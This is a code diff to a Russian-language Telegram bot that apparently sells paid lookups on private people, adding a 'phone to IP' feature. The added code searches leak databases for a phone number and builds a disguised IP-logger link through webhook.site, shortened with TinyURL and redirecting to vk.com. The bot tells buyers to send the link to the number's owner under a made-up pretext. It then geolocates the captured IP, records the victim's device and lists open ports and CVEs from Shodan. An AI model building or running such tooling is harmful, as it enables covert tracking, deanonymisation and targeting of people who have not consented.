@@ -181,7 +181,6 @@ db.serialize(() => {
         banned BOOLEAN DEFAULT 0,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
-    // Миграция: добавить колонку banned если её нет (игнорируем ошибку если уже есть)
     db.run(`ALTER TABLE users ADD COLUMN banned BOOLEAN DEFAULT 0`, () => {});
     db.run(`CREATE TABLE IF NOT EXISTS admins (
         telegram_id INTEGER UNIQUE,
@@ -193,6 +192,15 @@ db.serialize(() => {
         type TEXT,
         query TEXT,
         cost INTEGER,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )`);
+    // Таблица для IP-ловушек
+    db.run(`CREATE TABLE IF NOT EXISTS ip_traps (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        token TEXT UNIQUE,
+        short_url TEXT,
+        target_info TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
 });
@@ -224,6 +232,7 @@ const COSTS = {
     car_lookup:      15,  // Пробив авто по гос.номеру
     connections:     20,  // Связи и окружение человека
     doc_search:      20,  // Поиск по документам / паспорту
+    phone_to_ip:     20,  // определить IP по номеру телефона + IP-ловушка
     spiderfoot:      30,  // глубокое автосканирование SpiderFoot (230 модулей)
     full_dossier:    45,  // всё сразу (экономия 35⭐)
 };
@@ -331,6 +340,7 @@ function mainMenuKeyboard() {
             Markup.button.callback('🔗 Связи/окружение', 'connections'),
             Markup.button.callback('📄 Документы',        'doc_search'),
         ],
+        [Markup.button.callback('🌍 IP по номеру телефона', 'phone_to_ip')],
         [Markup.button.callback('🕷 SpiderFoot — глубокий скан', 'spiderfoot')],
         [
             Markup.button.callback('⭐ Купить звёзды', 'buy_stars'),
@@ -448,6 +458,30 @@ bot.command('balance', (ctx) => {
 
 bot.command('history', (ctx) => showHistory(ctx, ctx.from.id));
 
+// /check <token> — проверить ловушку-ссылку
+bot.command('check', async (ctx) => {
+    const token = ctx.message.text.split(' ')[1];
+    if (!token) {
+        // Показать все активные ловушки пользователя
+        db.all('SELECT token, short_url, target_info, created_at FROM ip_traps WHERE user_id = ? ORDER BY id DESC LIMIT 5',
+            [ctx.from.id], async (err, rows) => {
+                if (err || !rows.length) return ctx.reply('У вас нет активных ловушек.\n\nСоздайте через кнопку 🌍 IP по номеру телефона');
+                let msg = '🪤 <b>Ваши активные ловушки:</b>\n\n';
+                rows.forEach((r, i) => {
+                    const date = new Date(r.created_at).toLocaleString('ru-RU');
+                    msg += `${i+1}. Цель: ${r.target_info || '—'}\n`;
+                    msg += `🔗 ${r.short_url}\n`;
+                    msg += `🔑 Токен: <code>${r.token}</code>\n`;
+                    msg += `📅 ${date}\n`;
+                    msg += `/check ${r.token}\n\n`;
+                });
+                ctx.reply(msg, { parse_mode: 'HTML' });
+            });
+        return;
+    }
+    await checkTrap(ctx, token);
+});
+
 // ─── Admin commands ───────────────────────────────────────────────────────────
 bot.command('admin', (ctx) => isAdmin(ctx, () => ctx.reply('🔧 Панель администратора:', adminMenuKeyboard())));
 
@@ -555,6 +589,7 @@ const ACTION_PROMPTS = {
     connections:     `🔗 <b>Связи и окружение</b>\n\nВведите <b>ФИО</b> — найдём семью, коллег, партнёров:\nПример: <code>Иванов Иван Иванович</code>\n\n💰 Стоимость: ${COSTS.connections} ⭐`,
     doc_search:      `📄 <b>Поиск по документам</b>\n\nВведите номер паспорта, ИНН, СНИЛС или ФИО:\nПример: <code>4510 123456</code> или <code>500110474504</code>\n\n💰 Стоимость: ${COSTS.doc_search} ⭐`,
     reverse_image:   `📷 <b>Поиск личности по фото</b>\n\nОтправьте <b>фотографию</b> — бот определит кто на ней через Google Lens и найдёт все упоминания в сети.\n\n💰 Стоимость: ${COSTS.reverse_image} ⭐`,
+    phone_to_ip:     `🌍 <b>Определить IP по номеру телефона</b>\n\nВведите номер телефона:\nПример: <code>+79001234567</code>\n\nБот:\n• Ищет IP в утечках баз данных\n• Создаёт уникальную ссылку-ловушку — отправите её цели, и при клике получите точный IP\n• Показывает геолокацию оператора\n\n💰 Стоимость: ${COSTS.phone_to_ip} ⭐`,
     spiderfoot:      `🕷 <b>SpiderFoot — глубокий автоматический скан</b>\n\n230 OSINT-модулей. Поддерживаемые цели:\n• <code>IP-адрес</code> — хосты, порты, угрозы, WHOIS\n• <code>domain.com</code> — DNS, SSL, email, субдомены\n• <code>email@mail.ru</code> — аккаунты, утечки, PGP\n• <code>@username</code> — 500+ соцсетей, GitHub, форумы\n• <code>+79001234567</code> — телефон, геолокация\n\nВремя скана: 30–90 сек.\n💰 Стоимость: ${COSTS.spiderfoot} ⭐`,
 };
 
@@ -647,6 +682,13 @@ bot.action('buy_stars', (ctx) => {
 bot.action('back_menu', (ctx) => {
     ctx.answerCbQuery().catch(() => {});
     ctx.editMessageText('📋 Главное меню:', mainMenuKeyboard());
+});
+
+// Кнопка проверки ловушки
+bot.action(/^trap_check:(.+)$/, async (ctx) => {
+    const token = ctx.match[1];
+    ctx.answerCbQuery('🔍 Проверяю...').catch(() => {});
+    await checkTrap(ctx, token);
 });
 
 // Admin panel actions
@@ -817,6 +859,7 @@ bot.on('text', async (ctx) => {
                 await ctx.reply('📷 Пожалуйста, отправьте <b>фотографию</b> (не файл, а именно фото).', { parse_mode: 'HTML' });
                 userStates.set(userId, { action: 'reverse_image' }); // восстановить состояние
                 return;
+            case 'phone_to_ip':     await handlePhoneToIP(ctx, text);      break;
             case 'spiderfoot':      await handleSpiderFoot(ctx, text);     break;
             case 'full_dossier':    await handleFullDossier(ctx, text);    break;
         }
@@ -2220,6 +2263,218 @@ async function handleDocSearch(ctx, query) {
         `🔍 <a href="https://leakcheck.io/?query=${enc}">LeakCheck.io — утечки</a>`,
         { parse_mode: 'HTML', disable_web_page_preview: true }
     );
+}
+
+// ─── IP по номеру телефона ────────────────────────────────────────────────────
+
+// Создать webhook.site ловушку с редиректом на легитимный сайт
+async function createIPTrap(redirectUrl = 'https://vk.com') {
+    const resp = await axios.post('https://webhook.site/token', {
+        default_status: 302,
+        default_content: '',
+        default_headers: { 'Location': redirectUrl },
+    }, { headers: { 'Content-Type': 'application/json' }, timeout: 10000 });
+
+    const token = resp.data.uuid;
+    const trackUrl = `https://webhook.site/${token}`;
+
+    // Укорачиваем через TinyURL чтобы скрыть webhook.site
+    let shortUrl = trackUrl;
+    try {
+        const s = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackUrl)}`, { timeout: 5000 });
+        if (s.data?.startsWith('http')) shortUrl = s.data.trim();
+    } catch (_) {}
+
+    return { token, trackUrl, shortUrl };
+}
+
+// Проверить кто нажал на ловушку
+async function checkTrap(ctx, token) {
+    try {
+        const resp = await axios.get(
+            `https://webhook.site/token/${token}/requests?sorting=newest&per_page=20`,
+            { timeout: 10000 }
+        );
+        const requests = resp.data?.data || [];
+
+        if (!requests.length) {
+            return ctx.reply(
+                `🪤 <b>Ловушка: <code>${token}</code></b>\n\n⏳ Никто ещё не перешёл по ссылке.\nПопробуйте позже или напомните цели.`,
+                { parse_mode: 'HTML' }
+            );
+        }
+
+        let msg = `🪤 <b>Ловушка сработала! ${requests.length} визит(а)</b>\n\n`;
+        const seen = new Set();
+
+        for (const r of requests) {
+            if (seen.has(r.ip)) continue;
+            seen.add(r.ip);
+
+            const time = new Date(r.created_at).toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
+            msg += `🌍 <b>IP: <code>${r.ip}</code></b>\n`;
+            msg += `📅 Время (МСК): ${time}\n`;
+
+            // Определяем страну и город по IP
+            try {
+                const geo = await axios.get(`http://ip-api.com/json/${r.ip}?fields=country,city,regionName,isp,org,mobile,proxy`, { timeout: 5000 });
+                const g = geo.data;
+                if (g.country) msg += `📍 ${g.country}, ${g.city || '—'}, ${g.regionName || '—'}\n`;
+                if (g.isp)     msg += `📡 Провайдер: ${g.isp}\n`;
+                if (g.org)     msg += `🏢 Организация: ${g.org}\n`;
+                if (g.mobile)  msg += `📱 Мобильный интернет\n`;
+                if (g.proxy)   msg += `⚠️ Прокси/VPN\n`;
+
+                // Ссылки на карту
+                const [lat, lon] = (geo.data.lat && geo.data.lon) ? [geo.data.lat, geo.data.lon] : [null, null];
+                if (lat) msg += `🗺 <a href="https://www.google.com/maps?q=${lat},${lon}">Открыть на карте</a>\n`;
+            } catch (_) {}
+
+            // User-Agent анализ
+            const ua = r.user_agent || '';
+            if (ua) {
+                const device = ua.includes('iPhone') ? '📱 iPhone' :
+                               ua.includes('Android') ? '📱 Android' :
+                               ua.includes('Windows') ? '💻 Windows' :
+                               ua.includes('Mac') ? '💻 Mac' : '🖥 Unknown';
+                msg += `📲 Устройство: ${device}\n`;
+                msg += `🔍 User-Agent: <code>${ua.slice(0, 80)}</code>\n`;
+            }
+            msg += '\n';
+        }
+
+        await ctx.reply(msg, { parse_mode: 'HTML', disable_web_page_preview: true });
+
+        // Добавляем кнопку Shodan для каждого уникального IP
+        for (const ip of [...seen].slice(0, 3)) {
+            try {
+                const sh = await shodanLookup(ip);
+                if (sh?.ports?.length) {
+                    await ctx.reply(
+                        `🔍 <b>Shodan для ${ip}:</b>\n` +
+                        `🔌 Порты: <code>${sh.ports.join(', ')}</code>\n` +
+                        (sh.vulns?.length ? `🚨 CVE: ${sh.vulns.join(', ')}\n` : '') +
+                        `🔗 <a href="https://www.shodan.io/host/${ip}">Полный профиль Shodan</a>`,
+                        { parse_mode: 'HTML', disable_web_page_preview: true }
+                    );
+                }
+            } catch (_) {}
+        }
+    } catch (err) {
+        ctx.reply('❌ Ошибка проверки ловушки: ' + err.message);
+    }
+}
+
+async function handlePhoneToIP(ctx, phone) {
+    const clean = phone.replace(/[\s()−\-]/g, '');
+    await ctx.reply(`🌍 <b>Определение IP для номера: <code>${clean}</code></b>\n\nЗапускаю поиск...`, { parse_mode: 'HTML' });
+
+    // 1. Параллельный поиск в утечках и открытых источниках
+    const [leakData, googleIP, googleAccounts] = await Promise.all([
+        leakcheckPublic(clean).catch(() => null),
+        googleSearch(`"${clean}" IP-адрес адрес утечка база данных`),
+        googleSearch(`"${clean}" site:vk.com OR site:ok.ru OR site:t.me`),
+    ]);
+
+    // Результаты из утечек
+    if (leakData?.success && leakData.found > 0) {
+        let leakMsg = `🔓 <b>LeakCheck: найдено в ${leakData.found} утечках!</b>\n\n`;
+        if (leakData.fields?.includes('ip')) {
+            leakMsg += `🌍 <b>IP-адрес присутствует в скомпрометированных данных!</b>\n`;
+        }
+        if (leakData.fields?.length) {
+            leakMsg += `📋 Поля в утечках: ${leakData.fields.join(', ')}\n`;
+        }
+        if (leakData.sources?.length) {
+            leakMsg += `🗂 Источники: ${leakData.sources.slice(0, 5).join(', ')}\n`;
+        }
+        await ctx.reply(leakMsg, { parse_mode: 'HTML' });
+    } else {
+        await ctx.reply('🔓 Номер не найден в открытых базах утечек LeakCheck.');
+    }
+
+    // Google результаты с IP
+    const ipResults = googleIP.organic_results || [];
+    const ipRegex   = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
+    const foundIPs  = new Set();
+    const allText   = ipResults.map(r => `${r.title} ${r.snippet || ''}`).join(' ');
+    (allText.match(ipRegex) || []).forEach(ip => {
+        if (!ip.startsWith('0.') && !ip.startsWith('127.') && !ip.startsWith('192.168.')) foundIPs.add(ip);
+    });
+
+    if (foundIPs.size > 0) {
+        let ipMsg = `🌐 <b>IP-адреса найденные рядом с номером:</b>\n\n`;
+        for (const ip of foundIPs) {
+            ipMsg += `• <code>${ip}</code>\n`;
+        }
+        await ctx.reply(ipMsg, { parse_mode: 'HTML' });
+
+        // Геолокация каждого найденного IP
+        for (const ip of [...foundIPs].slice(0, 3)) {
+            try {
+                const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,regionName,isp,org`, { timeout: 5000 });
+                if (geo.data.status === 'success') {
+                    const g = geo.data;
+                    await ctx.reply(
+                        `📍 <code>${ip}</code> — ${g.country}, ${g.city}, ${g.regionName}\n📡 ${g.isp}`,
+                        { parse_mode: 'HTML' }
+                    );
+                }
+            } catch (_) {}
+        }
+    }
+
+    // Соцсети
+    const socialRes = googleAccounts.organic_results || [];
+    if (socialRes.length) {
+        let smMsg = `📱 <b>Профили в соцсетях:</b>\n\n`;
+        socialRes.slice(0, 4).forEach(r => {
+            const net = r.domain?.includes('vk.com') ? '🔵 ВКонтакте' : r.domain?.includes('ok.ru') ? '🟠 ОК' : '✈️ Telegram';
+            smMsg += `${net}: <a href="${r.link}">${r.title}</a>\n`;
+            if (r.snippet) smMsg += `  <i>${r.snippet.slice(0, 100)}</i>\n`;
+            smMsg += '\n';
+        });
+        await ctx.reply(smMsg, { parse_mode: 'HTML', disable_web_page_preview: true });
+    }
+
+    // 2. Создаём ловушку-ссылку
+    await ctx.reply('🪤 <b>Создаю ссылку-ловушку...</b>', { parse_mode: 'HTML' });
+
+    try {
+        // Редирект на ВКонтакте — выглядит правдоподобно
+        const trap = await createIPTrap('https://vk.com');
+
+        // Сохраняем в БД
+        db.run(
+            'INSERT INTO ip_traps (user_id, token, short_url, target_info) VALUES (?, ?, ?, ?)',
+            [ctx.from.id, trap.token, trap.shortUrl, clean]
+        );
+
+        const trapMsg =
+            `✅ <b>Ловушка создана!</b>\n\n` +
+            `📎 <b>Ссылка для отправки цели:</b>\n<code>${trap.shortUrl}</code>\n\n` +
+            `📋 <b>Как использовать:</b>\n` +
+            `1. Отправьте эту ссылку владельцу номера ${clean}\n` +
+            `2. Придумайте предлог (фото, видео, новость, акция)\n` +
+            `3. Когда они нажмут — их IP будет захвачен\n` +
+            `4. Проверьте результат: /check ${trap.token}\n\n` +
+            `🔑 Токен для проверки: <code>${trap.token}</code>\n` +
+            `⏱ Ловушка активна 7 дней`;
+
+        await ctx.reply(trapMsg, { parse_mode: 'HTML' });
+
+        // Быстрая кнопка проверки
+        await ctx.reply(
+            '⬇️ Нажмите кнопку чтобы проверить нажали ли на ссылку:',
+            Markup.inlineKeyboard([[
+                Markup.button.callback(`🔍 Проверить ловушку ${clean}`, `trap_check:${trap.token}`)
+            ]])
+        );
+
+    } catch (err) {
+        console.error('[phone_to_ip trap] error:', err.message);
+        await ctx.reply('❌ Не удалось создать ловушку. Попробуйте позже.');
+    }
 }
 
 // ─── SpiderFoot Scan ──────────────────────────────────────────────────────────
